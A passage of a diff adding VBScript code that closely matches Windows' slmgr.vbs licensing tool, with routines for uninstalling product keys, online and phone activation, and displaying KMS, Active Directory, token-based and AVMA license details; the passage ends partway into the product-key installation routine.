@@ -1,0 +1,4565 @@
+
+Private Sub UninstallProductKey(strActivationID)
+    Dim objService, objProduct
+    Dim lRet, strVersion, strDescription
+    Dim kmsServerFound, uninstallDone
+    Dim iIsPrimaryWindowsSku, bPrimaryWindowsSkuKeyUninstalled
+    Dim bCheckProductForCommand
+
+    On Error Resume Next
+
+    strActivationID = LCase(strActivationID)
+    kmsServerFound = False
+    uninstallDone = False
+
+    set objService = GetServiceObject("Version")
+    strVersion = objService.Version
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", ProductKeyID", PartialProductKeyNonNullWhereClause)
+        strDescription = objProduct.Description
+
+        bCheckProductForCommand = CheckProductForCommand(objProduct, strActivationID)
+
+        If (bCheckProductForCommand) Then
+            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+            If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
+                    OutputIndeterminateOperationWarning(objProduct)
+            End If
+
+            objProduct.UninstallProductKey()
+            QuitIfError()
+
+            ' Uninstalling a product key could change Windows licensing state.
+            ' Since the service determines if it can shut down and when is the next start time
+            ' based on the licensing state we should reconsume the licenses here.
+            objService.RefreshLicenseStatus()
+
+            ' For Windows (i.e. if no activationID specified), always
+            ' ensure that product-key for primary SKU is uninstalled
+            If (strActivationID <> "") Or (iIsPrimaryWindowsSku = 1) Then
+                uninstallDone = True
+            End If
+
+            LineOut GetResource("L_MsgUninstalledPKey")
+
+        ' Check whether a ActID belongs to KMS server.
+        ' Do this for all ActID other than one whose pkey is being uninstalled
+        ElseIf IsKmsServer(strDescription) Then
+            kmsServerFound = True
+        End If
+
+        If (kmsServerFound = True) And (uninstallDone = True) Then
+            Exit For
+        End If
+    Next
+
+    If kmsServerFound = True Then
+        ' Set the KMS version in the registry (both 64 and 32 bit locations)
+        lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion", strVersion)
+        If (lRet <> 0) Then
+            QuitWithError lRet
+        End If
+
+        lRet = SetRegistryStr(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion", strVersion)
+        If (lRet <> 0) Then
+            QuitWithError lRet
+        End If
+    Else
+        ' Clear the KMS version from the registry (both 64 and 32 bit locations)
+        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion")
+        If (lRet <> 0 And lRet <> 2) Then
+            QuitWithError lRet
+        End If
+
+        lRet = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion")
+        If (lRet <> 0 And lRet <> 2) Then
+            QuitWithError lRet
+        End If
+    End If
+
+    If uninstallDone = False Then
+        LineOut GetResource("L_MsgErrorPKey")
+    End If
+End Sub
+
+Private Sub DisplayIID(strActivationID)
+    Dim objProduct
+    Dim iIsPrimaryWindowsSku, bFoundAtLeastOneKey
+    Dim bCheckProductForCommand
+
+    strActivationID = LCase(strActivationID)
+
+    bFoundAtLeastOneKey = False
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", OfflineInstallationId", PartialProductKeyNonNullWhereClause)
+
+        bCheckProductForCommand = CheckProductForCommand(objProduct, strActivationID)
+
+        If (bCheckProductForCommand) Then
+            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+            If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
+                    OutputIndeterminateOperationWarning(objProduct)
+            End If
+
+            LineOut GetResource("L_MsgInstallationID") & objProduct.OfflineInstallationId
+            bFoundAtLeastOneKey = True
+
+            If (strActivationID <> "") Or (iIsPrimaryWindowsSku = 1) Then
+                Exit Sub
+            End If
+        End If
+    Next
+
+    If (bFoundAtLeastOneKey = TRUE) Then
+        LineOut ""
+        LineOut GetResource("L_MsgPhoneNumbers")
+    Else
+        LineOut GetResource("L_MsgErrorProductNotFound")
+    End If
+End Sub
+
+Private Sub DisplayActivatingSku(objProduct)
+    Dim strOutput
+
+    strOutput = Replace(GetResource("L_MsgActivating"), "%PRODUCTNAME%", objProduct.Name)
+    strOutput = Replace(strOutput, "%PRODUCTID%", objProduct.ID)
+    LineFlush strOutput
+End Sub
+
+Private Sub DisplayActivatedStatus(objProduct)
+    If (objProduct.LicenseStatus = 1) Then
+        LineOut GetResource("L_MsgActivated")
+    ElseIf (objProduct.LicenseStatus = 4) Then
+        LineOut GetResource("L_MsgErrorText_8") & GetResource("L_MsgErrorText_11")
+    ElseIf ((objProduct.LicenseStatus = 5) And (objProduct.LicenseStatusReason = HR_SL_E_NOT_GENUINE)) Then
+        LineOut GetResource("L_MsgErrorText_8") & GetResource("L_MsgErrorText_12")
+    ElseIf (objProduct.LicenseStatus = 6) Then
+        LineOut GetResource("L_MsgActivated")
+        LineOut GetResource("L_MsgLicenseStatusExtendedGrace_1")
+    Else
+        LineOut GetResource("L_MsgActivated_Failed")
+    End If
+End Sub
+
+Private Sub ActivateProduct(strActivationID)
+    Dim objService, objProduct
+    Dim iIsPrimaryWindowsSku, bFoundAtLeastOneKey
+    Dim strOutput
+    Dim bCheckProductForCommand
+
+    strActivationID = LCase(strActivationID)
+
+    bFoundAtLeastOneKey = False
+
+    set objService = GetServiceObject("Version")
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", LicenseStatus, VLActivationTypeEnabled", PartialProductKeyNonNullWhereClause)
+
+        bCheckProductForCommand = CheckProductForCommand(objProduct, strActivationID)
+
+        If (bCheckProductForCommand) Then
+            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+            If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
+                    OutputIndeterminateOperationWarning(objProduct)
+            End If
+
+            '
+            ' This routine does not perform token-based activation.
+            ' If configured for TA, then show message to user.
+            '
+            If (objProduct.VLActivationTypeEnabled = 3) Then
+                LineOut GetResource("L_MsgTokenBasedActivationMustBeDone")
+                Exit Sub
+            End If
+
+            strOutput = Replace(GetResource("L_MsgActivating"), "%PRODUCTNAME%", objProduct.Name)
+            strOutput = Replace(strOutput, "%PRODUCTID%", objProduct.ID)
+            LineOut strOutput
+            On Error Resume Next
+            '
+            ' Avoid using a MAK activation count up unless needed
+            '
+            If (Not(IsMAK(objProduct.Description)) Or (objProduct.LicenseStatus <> 1)) Then
+                objProduct.Activate()
+                QuitIfError()
+                objService.RefreshLicenseStatus()
+                objProduct.refresh_
+            End If
+            DisplayActivatedStatus objProduct
+
+            bFoundAtLeastOneKey = True
+            If (strActivationID <> "") Or (iIsPrimaryWindowsSku = 1) Then
+                Exit Sub
+            End If
+        End If
+    Next
+
+    If (bFoundAtLeastOneKey = True) Then
+        Exit Sub
+    End If
+
+    LineOut GetResource("L_MsgErrorProductNotFound")
+End Sub
+
+Private Sub PhoneActivateProduct(strCID, strActivationID)
+    Dim objService, objProduct
+    Dim iIsPrimaryWindowsSku, bFoundAtLeastOneKey
+    Dim strOutput
+    Dim bCheckProductForCommand
+
+    strActivationID = LCase(strActivationID)
+
+    bFoundAtLeastOneKey = False
+    set objService = GetServiceObject("Version")
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause & ", OfflineInstallationId, LicenseStatus, LicenseStatusReason", PartialProductKeyNonNullWhereClause)
+
+        bCheckProductForCommand = CheckProductForCommand(objProduct, strActivationID)
+
+        If (bCheckProductForCommand) Then
+            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+            If (strActivationID = "") And (iIsPrimaryWindowsSku = 2) Then
+                    OutputIndeterminateOperationWarning(objProduct)
+            End If
+
+            On Error Resume Next
+            objProduct.DepositOfflineConfirmationId objProduct.OfflineInstallationId, strCID
+            QuitIfError()
+            objService.RefreshLicenseStatus()
+            objProduct.refresh_
+            If (objProduct.LicenseStatus = 1) Then
+                strOutput = Replace(GetResource("L_MsgConfID"), "%ACTID%", objProduct.ID)
+                LineOut strOutput
+            ElseIf (objProduct.LicenseStatus = 4) Then
+                LineOut GetResource("L_MsgErrorText_8") & GetResource("L_MsgErrorText_11")
+            ElseIf ((objProduct.LicenseStatus = 5) And (objProduct.LicenseStatusReason = HR_SL_E_NOT_GENUINE)) Then
+                    LineOut GetResource("L_MsgErrorText_8") & GetResource("L_MsgErrorText_12")
+            ElseIf (objProduct.LicenseStatus = 6) Then
+                    LineOut GetResource("L_MsgActivated")
+                    LineOut GetResource("L_MsgLicenseStatusExtendedGrace_1")
+            Else
+                LineOut GetResource("L_MsgActivated_Failed")
+            End If
+
+            bFoundAtLeastOneKey = True
+            If (strActivationID <> "") Or (iIsPrimaryWindowsSku = 1) Then
+                Exit Sub
+            End If
+        End If
+    Next
+
+    If (bFoundAtLeastOneKey = True) Then
+        Exit Sub
+    End If
+
+    LineOut GetResource("L_MsgErrorProductNotFound")
+End Sub
+
+Private Sub DisplayKMSInformation(objService, objProduct)
+    Dim dwValue
+    Dim boolValue
+    Dim KeyManagementServiceTotalRequests
+
+    Dim objProductKMSValues
+
+    set objProductKMSValues = GetProductObject( _
+        "IsKeyManagementServiceMachine, KeyManagementServiceCurrentCount, " & _
+        "KeyManagementServiceTotalRequests, KeyManagementServiceFailedRequests, " & _
+        "KeyManagementServiceUnlicensedRequests, KeyManagementServiceLicensedRequests, " & _
+        "KeyManagementServiceOOBGraceRequests, KeyManagementServiceOOTGraceRequests, " & _
+        "KeyManagementServiceNonGenuineGraceRequests, KeyManagementServiceNotificationRequests", _
+        "id = '" & objProduct.ID & "'")
+
+    If objProductKMSValues.IsKeyManagementServiceMachine > 0 Then
+        LineOut ""
+        LineOut GetResource("L_MsgKmsEnabled")
+        LineOut "    " & GetResource("L_MsgKmsCurrentCount") & objProductKMSValues.KeyManagementServiceCurrentCount
+
+        dwValue = objService.KeyManagementServiceListeningPort
+        If 0 = dwValue Then
+            LineOut "    " & GetResource("L_MsgKmsListeningOnPort") & DefaultPort
+        Else
+            LineOut "    " & GetResource("L_MsgKmsListeningOnPort") & dwValue
+        End If
+
+        boolValue = objService.KeyManagementServiceDnsPublishing
+        If true = boolValue Then
+            LineOut "    " & GetResource("L_MsgKmsDnsPublishingEnabled")
+        Else
+            LineOut "    " & GetResource("L_MsgKmsDnsPublishingDisabled")
+        End If
+
+        boolValue = objService.KeyManagementServiceLowPriority
+        If false = boolValue Then
+            LineOut "    " & GetResource("L_MsgKmsPriNormal")
+        Else
+            LineOut "    " & GetResource("L_MsgKmsPriLow")
+        End If
+
+        On Error Resume Next
+
+        KeyManagementServiceTotalRequests = objProductKMSValues.KeyManagementServiceTotalRequests
+
+        If (Not(IsNull(KeyManagementServiceTotalRequests))) And (Not(IsEmpty(KeyManagementServiceTotalRequests))) Then
+            LineOut ""
+            LineOut GetResource("L_MsgKmsCumulativeRequestsFromClients")
+            LineOut "    " & GetResource("L_MsgKmsTotalRequestsRecieved") & objProductKMSValues.KeyManagementServiceTotalRequests
+            LineOut "    " & GetResource("L_MsgKmsFailedRequestsReceived") & objProductKMSValues.KeyManagementServiceFailedRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusUnlicensed") & objProductKMSValues.KeyManagementServiceUnlicensedRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusLicensed") & objProductKMSValues.KeyManagementServiceLicensedRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusInitialGrace") & objProductKMSValues.KeyManagementServiceOOBGraceRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusLicenseExpiredOrHwidOot") & objProductKMSValues.KeyManagementServiceOOTGraceRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusNonGenuineGrace") & objProductKMSValues.KeyManagementServiceNonGenuineGraceRequests
+            LineOut "    " & GetResource("L_MsgKmsRequestsWithStatusNotification") & objProductKMSValues.KeyManagementServiceNotificationRequests
+        End If
+    End If
+End Sub
+
+Private Sub DisplayADClientInformation(objService, objProduct)
+    LineOut ""
+    LineOut GetResource("L_MsgVLMostRecentActivationInfo")
+    LineOut GetResource("L_MsgADInfo")
+
+    LineOut "    " & GetResource("L_MsgADInfoAOName")       & objProduct.ADActivationObjectName
+    LineOut "    " & GetResource("L_MsgADInfoAODN")         & objProduct.ADActivationObjectDN
+    LineOut "    " & GetResource("L_MsgADInfoExtendedPid")  & objProduct.ADActivationCsvlkPid
+    LineOut "    " & GetResource("L_MsgADInfoActID")        & objProduct.ADActivationCsvlkSkuId
+End Sub
+
+Private Sub DisplayTkaClientInformation(objService, objProduct)
+    LineOut ""
+    LineOut GetResource("L_MsgVLMostRecentActivationInfo")
+    LineOut GetResource("L_MsgTkaInfo")
+
+    LineOut "    " & Replace(GetResource("L_MsgTkaInfoILID"      ), "%ILID%"      , objProduct.TokenActivationILID)
+    LineOut "    " & Replace(GetResource("L_MsgTkaInfoILVID"     ), "%ILVID%"     , objProduct.TokenActivationILVID)
+    LineOut "    " & Replace(GetResource("L_MsgTkaInfoGrantNo"   ), "%GRANTNO%"   , objProduct.TokenActivationGrantNumber)
+    LineOut "    " & Replace(GetResource("L_MsgTkaInfoThumbprint"), "%THUMBPRINT%", objProduct.TokenActivationCertificateThumbprint)
+End Sub
+
+Private Sub DisplayKMSClientInformation(objService, objProduct)
+    Dim strKms, strIpAddress, strPort, strOutput
+    Dim iVLRenewalInterval, iVLActivationInterval
+    Dim bFixedKms, bKmsLookupDomain, strKmsLookupDomain
+
+    iVLRenewalInterval = objProduct.VLRenewalInterval
+    iVLActivationInterval = objProduct.VLActivationInterval
+
+    LineOut ""
+    LineOut GetResource("L_MsgVLMostRecentActivationInfo")
+    LineOut GetResource("L_MsgKmsInfo")
+    LineOut "    " & GetResource("L_MsgCmid") & objService.ClientMachineID
+
+    strKmsLookupDomain = objProduct.KeyManagementServiceLookupDomain
+
+    If strKmsLookupDomain <> "" and Not IsNull(strKmsLookupDomain) Then
+        bKmsLookupDomain = True
+        LineOut "    " & GetResource("L_MsgKmsLookupDomain") & strKmsLookupDomain
+    End If
+
+    strKms = objProduct.KeyManagementServiceMachine
+
+    if strKms <> "" And Not IsNull(strKms) Then
+        bFixedKms = True
+        strPort = objProduct.KeyManagementServicePort
+        If (strPort = 0) Then
+            strPort = DefaultPort
+        End If
+        LineOut "    " & GetResource("L_MsgRegisteredKmsName") & strKms & ":" & strPort
+    Else
+        strKms = objProduct.DiscoveredKeyManagementServiceMachineName
+        strPort = objProduct.DiscoveredKeyManagementServiceMachinePort
+
+        If IsNull(strKms) Or (strKms = "") Or IsNull(strPort) Or (strPort = 0) Then
+            LineOut "    " & GetResource("L_MsgKmsFromDnsUnavailable")
+        Else
+            LineOut "    " & GetResource("L_MsgKmsFromDns") & strKms & ":" & strPort
+        End If
+    End If
+
+    strIpAddress = objProduct.DiscoveredKeyManagementServiceMachineIpAddress
+
+    If IsNull(strIpAddress) Or (strIpAddress = "") Then
+        LineOut "    " & GetResource("L_MsgKmsIpAddressUnavailable")
+    Else
+        LineOut "    " & GetResource("L_MsgKmsIpAddress") & strIpAddress
+    End If
+
+    LineOut "    " & GetResource("L_MsgKmsPID4") & objProduct.KeyManagementServiceProductKeyID
+    strOutput = Replace(GetResource("L_MsgActivationInterval"), "%INTERVAL%", iVLActivationInterval)
+    LineOut "    " & strOutput
+    strOutput = Replace(GetResource("L_MsgRenewalInterval"), "%INTERVAL%", iVLRenewalInterval)
+    LineOut "    " & strOutput
+
+    if (objService.KeyManagementServiceHostCaching = True) Then
+        LineOut "    " & GetResource("L_MsgKmsHostCachingEnabled")
+    Else
+        LineOut "    " & GetResource("L_MsgKmsHostCachingDisabled")
+    End If
+
+    If bKmsLookupDomain And bFixedKms Then
+        LineOut ""
+        LineOut Replace(GetResource("L_MsgKmsUseMachineNameOverrides"), "%KMS%", strKms & ":" & strPort)
+    End If
+End Sub
+
+Private Sub DisplayAVMAClientInformation(objProduct)
+    Dim strHostName, strPid
+    Dim displayDate
+    Dim bHostName, bFiletime, bPid
+
+    strHostName = objProduct.AutomaticVMActivationHostMachineName
+    bHostName = strHostName <> "" And Not IsNull(strHostName)
+
+    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
+    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
+    bFiletime = displayDate.GetFileTime(false) <> 0
+
+    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
+    bPid = strPid <> "" And Not IsNull(strPid)
+
+    If bHostName Or bFiletime Or bPid Then
+        LineOut ""
+        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
+        LineOut GetResource("L_MsgAVMAInfo")
+
+        If bHostName Then
+            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
+        Else
+            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
+        End If
+
+        If bFiletime Then
+            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
+        Else
+            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
+        End If
+
+        If bPid Then
+            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
+        Else
+            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
+        End If
+    End If
+
+End Sub
+
+'
+' Display all information for /dlv and /dli
+' If you add need to access new properties through WMI you must add them to the
+' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
+' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
+'
+Private Sub DisplayAllInformation(strParm, bVerbose)
+    Dim objService, objProduct
+    Dim strServiceSelectClause
+    Dim objProductIter, strIterSelectClause, strProductSelectClause
+    Dim strDescription, bKmsClient, strSLActID, bKmsServer, bTBL
+    Dim strAVMAId, bAVMA
+    Dim ls, gpMin, gpDay, displayDate
+    Dim strOutput
+    Dim strUrl
+    Dim bShowSkuInformation
+    Dim iIsPrimaryWindowsSku, bUseDefault
+    Dim productKeyFound
+
+    Dim strErr
+    strParm = LCase(strParm)
+    productKeyFound = False
+
+    strServiceSelectClause = _
+        "KeyManagementServiceListeningPort, KeyManagementServiceDnsPublishing, " & _
+        "KeyManagementServiceLowPriority, ClientMachineId, KeyManagementServiceHostCaching, " & _
+        "Version"
+
+    strProductSelectClause = _
+        ProductIsPrimarySkuSelectClause & ", " & _
+        "ProductKeyID, ProductKeyChannel, OfflineInstallationId, " & _
+        "ProcessorURL, MachineURL, UseLicenseURL, ProductKeyURL, ValidationURL, " & _
+        "GracePeriodRemaining, LicenseStatus, LicenseStatusReason, EvaluationEndDate, " & _
+        "VLRenewalInterval, VLActivationInterval, KeyManagementServiceLookupDomain, KeyManagementServiceMachine, " & _
+        "KeyManagementServicePort, DiscoveredKeyManagementServiceMachineName, " & _
+        "DiscoveredKeyManagementServiceMachinePort, DiscoveredKeyManagementServiceMachineIpAddress, KeyManagementServiceProductKeyID," & _
+        "TokenActivationILID, TokenActivationILVID, TokenActivationGrantNumber," & _
+        "TokenActivationCertificateThumbprint, TokenActivationAdditionalInfo, TrustedTime," & _
+        "ADActivationObjectName, ADActivationObjectDN, ADActivationCsvlkPid, ADActivationCsvlkSkuId, VLActivationTypeEnabled, VLActivationType," & _
+        "IAID, AutomaticVMActivationHostMachineName, AutomaticVMActivationLastActivationTime, AutomaticVMActivationHostDigitalPid2"
+    
+    If bVerbose Then
+        strServiceSelectClause = "RemainingWindowsReArmCount, " & strServiceSelectClause
+        strProductSelectClause = "RemainingAppReArmCount, RemainingSkuReArmCount, " & strProductSelectClause
+    End If
+
+    set objService = GetServiceObject(strServiceSelectClause)
+
+    If bVerbose Then
+        LineOut GetResource("L_MsgServiceVersion") & objService.Version
+    End If
+
+    If (strParm = "all") Then
+        strIterSelectClause = strProductSelectClause
+    Else
+        strIterSelectClause = ProductIsPrimarySkuSelectClause
+    End If
+
+    For Each objProductIter in GetProductCollection(strIterSelectClause, EmptyWhereClause)
+
+        strSLActID = objProductIter.ID
+
+        ' Display information if:
+        '    parm = "all" or
+        '    ActID = parm or
+        '    default to current ActID (parm = "" and IsPrimaryWindowsSKU is 1 or 2)
+        iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProductIter)
+        bUseDefault = False
+        bShowSkuInformation = False
+
+        If (strParm = "" And ((iIsPrimaryWindowsSku = 1) Or (iIsPrimaryWindowsSku = 2))) Then
+            bUseDefault = True
+            bShowSkuInformation = True
+        End If
+
+        If (strParm = "" And (objProductIter.LicenseIsAddon And objProductIter.PartialProductKey <> "")) Then
+            bShowSkuInformation = True
+        End If
+
+        If (strParm = "all") Then
+            bShowSkuInformation = True
+        End If
+
+        If (strParm = LCase(strSLActID)) Then
+            bShowSkuInformation = True
+        End If
+
+        If (bShowSkuInformation) Then
+        
+            If (strParm = "all") Then
+                set objProduct = objProductIter
+            Else
+                set objProduct = GetProductObject(strProductSelectClause, "id = '" & objProductIter.ID & "'")
+            End If
+
+            strDescription = objProduct.Description
+
+            'If the user didn't specify anything and we are showing the default case, warn them
+            ' if this can't be verified as the primary SKU
+            If ((bUseDefault = True) And (iIsPrimaryWindowsSku = 2)) Then
+                OutputIndeterminateOperationWarning(objProduct)
+            End IF
+
+            productKeyFound = True
+
+            LineOut ""
+            LineOut GetResource("L_MsgProductName") & objProduct.Name
+
+            LineOut GetResource("L_MsgProductDesc") & strDescription
+
+            If objProduct.TokenActivationAdditionalInfo <> "" Then
+                LineOut Replace( _
+                    GetResource("L_MsgTkaInfoAdditionalInfo"), _
+                    "%MOREINFO%", _
+                    objProduct.TokenActivationAdditionalInfo _
+                    )
+            End If
+
+            bKmsServer = IsKmsServer(strDescription)
+            bKmsClient = IsKmsClient(strDescription)
+            bTBL       = IsTBL(strDescription)
+            bAVMA      = IsAVMA(strDescription)
+
+            If bVerbose Then
+                LineOut GetResource("L_MsgActID") & strSLActID
+                LineOut GetResource("L_MsgAppID") & objProduct.ApplicationID
+                LineOut GetResource("L_MsgPID4") & objProduct.ProductKeyID
+                LineOut GetResource("L_MsgChannel") & objProduct.ProductKeyChannel
+                LineOut GetResource("L_MsgInstallationID") & objProduct.OfflineInstallationId
+
+                If (NOT bKmsClient) AND (NOT bAVMA) Then
+
+                    'Note that we are re-using the UseLicenseURL for the Product Activation
+                    'URL for down-level compatibility reasons
+
+                    strUrl = objProduct.ProcessorURL
+                    If strUrl <> "" Then
+                        LineOut GetResource("L_MsgProcessorCertUrl") & strUrl
+                    End If
+
+                    strUrl = objProduct.MachineURL
+                    If strUrl <> "" Then
+                        LineOut GetResource("L_MsgMachineCertUrl") & strUrl
+                    End If
+
+                    strUrl = objProduct.UseLicenseURL
+                    If strUrl <> "" Then
+                        LineOut GetResource("L_MsgUseLicenseCertUrl") & strUrl
+                    End If
+
+                    strUrl = objProduct.ProductKeyURL
+                    If strUrl <> "" Then
+                        LineOut GetResource("L_MsgPKeyCertUrl") & strUrl
+                    End If
+
+                    strUrl = objProduct.ValidationURL
+                    If strUrl <> "" Then
+                        LineOut GetResource("L_MsgValidationUrl") & strUrl
+                    End If
+
+                End If
+            End If
+
+            If objProduct.PartialProductKey <> "" Then
+                LineOut GetResource("L_MsgPartialPKey") & objProduct.PartialProductKey
+            Else
+                LineOut GetResource("L_MsgErrorLicenseNotInUse")
+            End If
+
+            ls = objProduct.LicenseStatus
+
+            If ls = 0 Then
+                LineOut GetResource("L_MsgLicenseStatusUnlicensed_1")
+
+            ElseIf ls = 1 Then
+                LineOut GetResource("L_MsgLicenseStatusLicensed_1")
+                gpMin = objProduct.GracePeriodRemaining
+                If (gpMin <> 0) Then
+                    gpDay = GetDaysFromMins(gpMin)
+                    If (bTBL) Then
+                        strOutput = Replace(GetResource("L_MsgLicenseStatusTBL_1"), "%MINUTE%", gpMin)
+                    ElseIf (bAVMA) Then
+                        strOutput = Replace(GetResource("L_MsgLicenseStatusAVMA_1"), "%MINUTE%", gpMin)
+                    Else
+                        strOutput = Replace(GetResource("L_MsgLicenseStatusVL_1"), "%MINUTE%", gpMin)
+                    End If
+                    strOutput = Replace(strOutput, "%DAY%", gpDay)
+                    LineOut strOutput
+                End If
+
+            ElseIf ls = 2 Then
+                LineOut GetResource("L_MsgLicenseStatusInitialGrace_1")
+                gpMin = objProduct.GracePeriodRemaining
+                gpDay = GetDaysFromMins(gpMin)
+                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
+                strOutput = Replace(strOutput, "%DAY%", gpDay)
+                LineOut strOutput
+
+            ElseIf ls = 3 Then
+                LineOut GetResource("L_MsgLicenseStatusAdditionalGrace_1")
+                gpMin = objProduct.GracePeriodRemaining
+                gpDay = GetDaysFromMins(gpMin)
+                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
+                strOutput = Replace(strOutput, "%DAY%", gpDay)
+                LineOut strOutput
+
+            ElseIf ls = 4 Then
+                LineOut GetResource("L_MsgLicenseStatusNonGenuineGrace_1")
+                gpMin = objProduct.GracePeriodRemaining
+                gpDay = GetDaysFromMins(gpMin)
+                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
+                strOutput = Replace(strOutput, "%DAY%", gpDay)
+                LineOut strOutput
+
+            ElseIf ls = 5 Then
+                LineOut GetResource("L_MsgLicenseStatusNotification_1")
+                strErr = CStr(Hex(objProduct.LicenseStatusReason))
+                if (objProduct.LicenseStatusReason = HR_SL_E_NOT_GENUINE) Then
+                   strOutput = Replace(GetResource("L_MsgNotificationErrorReasonNonGenuine"), "%ERRCODE%", strErr)
+                ElseIf (objProduct.LicenseStatusReason = HR_SL_E_GRACE_TIME_EXPIRED) Then
+                    strOutput = Replace(GetResource("L_MsgNotificationErrorReasonExpiration"), "%ERRCODE%", strErr)
+                Else
+                    strOutput = Replace(GetResource("L_MsgNotificationErrorReasonOther"), "%ERRCODE%", strErr)
+                End If
+                LineOut strOutput
+
+            ElseIf ls = 6 Then
+                LineOut GetResource("L_MsgLicenseStatusExtendedGrace_1")
+                gpMin = objProduct.GracePeriodRemaining
+                gpDay = GetDaysFromMins(gpMin)
+                strOutput = Replace(GetResource("L_MsgLicenseStatusTimeRemaining"), "%MINUTE%", gpMin)
+                strOutput = Replace(strOutput, "%DAY%", gpDay)
+                LineOut strOutput
+
+            Else
+                LineOut GetResource("L_MsgLicenseStatusUnknown")
+            End If
+
+            If (ls <> 0 And bVerbose) Then
+                Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
+                displayDate.Value = objProduct.EvaluationEndDate
+                If (displayDate.GetFileTime(false) <> 0) Then
+                    LineOut GetResource("L_MsgLicenseStatusEvalEndData") & displayDate.GetVarDate
+                End If
+            End If
+
+            If (bVerbose) Then
+                If (LCase(objProduct.ApplicationId) = WindowsAppId) Then
+                    LineOut Replace(GetResource("L_MsgRemainingWindowsRearmCount"), "%COUNT%", objService.RemainingWindowsReArmCount)
+                Else
+                    LineOut Replace(GetResource("L_MsgRemainingAppRearmCount"), "%COUNT%", objProduct.RemainingAppReArmCount)
+                End If
+                LineOut Replace(GetResource("L_MsgRemainingSkuRearmCount"), "%COUNT%", objProduct.RemainingSkuReArmCount)
+
+                Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
+                displayDate.Value = objProduct.TrustedTime
+                If (displayDate.GetFileTime(false) <> 0) Then
+                    LineOut GetResource("L_MsgCurrentTrustedTime") & displayDate.GetVarDate
+                End If
+
+            End If
+
+            '
+            ' KMS client properties
+            '
+
+            If bKmsClient Then
+
+                If (objProduct.VLActivationTypeEnabled = 1) Then
+                    LineOut GetResource("L_MsgVLActivationTypeAD")
+                ElseIf (objProduct.VLActivationTypeEnabled = 2) Then
+                    LineOut GetResource("L_MsgVLActivationTypeKMS")
+                ElseIf (objProduct.VLActivationTypeEnabled = 3) Then
+                    LineOut GetResource("L_MsgVLActivationTypeToken")
+                Else
+                    LineOut GetResource("L_MsgVLActivationTypeAll")
+                End If
+
+                If IsADActivated(objProduct) Then
+                    DisplayADClientInformation objService, objProduct
+                ElseIf IsTokenActivated(objProduct) Then
+                    DisplayTkaClientInformation objService, objProduct
+                ElseIf ls <> 1 Then
+                    LineOut GetResource("L_MsgPleaseActivateRefreshKMSInfo")
+                Else
+                    DisplayKMSClientInformation objService, objProduct
+                End If
+            End If
+
+            If (bKmsServer Or (iIsPrimaryWindowsSku = 1) Or (iIsPrimaryWindowsSku = 2)) Then
+                DisplayKMSInformation objService, objProduct
+            End If
+
+            If (bAVMA) Then
+                strAVMAId = objProduct.IAID
+
+                If strAVMAId <> "" And Not IsNull(strAVMAId) Then
+                    LineOut GetResource("L_MsgAVMAID") & strAVMAId
+                Else
+                    LineOut GetResource("L_MsgAVMAID") & GetResource("L_MsgNotAvailable")
+                End If
+
+                DisplayAVMAClientInformation objProduct
+            End If
+      
+            'We should stop processing if we aren't processing All and either we were told to process a single
+            'entry only or we found the primary SKU
+            If strParm <> "all" Then
+                If (strParm = LCase(strSLActID)) Then
+                    Exit For  'no need to continue
+                End If
+            End If
+
+            LineOut ""
+        End If
+    Next
+
+    If productKeyFound = False Then
+        LineOut GetResource("L_MsgErrorPKey")
+    End If
+
+End Sub
+
+Private Function GetDaysFromMins(iMins)
+    Dim iMinsInADay
+    iMinsInADay = 24 * 60
+    ' VBScript only supports Int truncation or 'evens' rounding, it does not support a CEILING/FLOOR operation or MOD
+    ' To simulate the CEILING operation used for other grace-day calculations in the UX we need to add the # of mins
+    ' in a day minus 1 to the input then divide by the mins in a day
+    GetDaysFromMins = Int((iMins + iMinsInADay - 1) / iMinsInADay)
+End Function
+
+Private Sub InstallProductKey(strProductKey)
+    Dim objService, objProduct
+    Dim lRet, strDescription, strOutput, strVersion
+    Dim iIsPrimaryWindowsSku, bIsKMS
+
